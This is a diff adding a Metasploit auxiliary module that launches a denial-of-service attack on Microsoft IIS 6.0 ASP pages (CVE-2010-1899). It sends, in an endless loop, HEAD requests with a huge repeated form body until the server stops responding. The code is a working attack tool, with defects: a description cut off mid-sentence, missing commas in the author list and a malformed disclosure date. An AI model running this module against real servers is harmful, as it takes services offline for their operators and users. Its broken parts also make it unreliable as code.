@@ -1,0 +1,77 @@
+##
+# $Id$
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Auxiliary
+
+	include Msf::Exploit::Remote::Tcp
+	include Msf::Auxiliary::Dos
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'           => 'Microsoft IIS 6.0 ASP Stack Exhaustion Denial of Service',
+			'Description'    => %q{
+					The vulnerability allows remote unauthenticated attackers to force the IIS server
+				to become unresponsive until the IIS service is restarted manually by the administrator.
+				Required is that Active Server Pages are hosted by the IIS and that an ASP script reads
+				out a Post Form value.  When the following ASP script is hosted by IIS the attacker can run the
+			},
+			'Author'         =>
+				[
+					'Alligator Security Team',
+					'Heyder Andrade <heyder[at]alligatorteam.org>'
+					'Leandro Oliveira <leadro[at]alligatorteam.org>'
+				],
+			'License'        => MSF_LICENSE,
+			'Version'        => '$Revision$',
+			'References'     =>
+				[
+					[ 'CVE', '2010-1899' ],
+					[ 'URL', 'http://www.exploit-db.com/exploits/15167/' ],
+				],
+			'DisclosureDate' => 'Out 01 2010'))
+
+		register_options(
+			[
+				Opt::RPORT(80),
+				OptString.new('URI', [ true, 'URI to request', '/page.asp' ])
+			], self.class )
+	end
+
+
+	def run
+		print_status("Attacking http://#{rhost}:#{rport}#{datastore['URI']}")
+
+		begin
+			while(1)
+				begin
+					connect
+					payload = "C=A&" * 40000
+					length = payload.size
+					sploit = "HEAD #{datastore['URI']} HTTP/1.1\r\n"
+					sploit << "Host: #{rhost}\r\n"
+					sploit << "Connection:Close\r\n"
+					sploit << "Content-Type: application/x-www-form-urlencoded\r\n"
+					sploit << "Content-Length:#{length} \r\n\r\n"
+					sploit << payload
+					sock.put(sploit)
+					#print_status("DoS packet sent.")
+					disconnect
+				rescue Errno::ECONNRESET
+					next
+				end
+			end
+		rescue Errno::EPIPE
+			print_good("IIS should now be unavailable")
+		end
+	end
+end
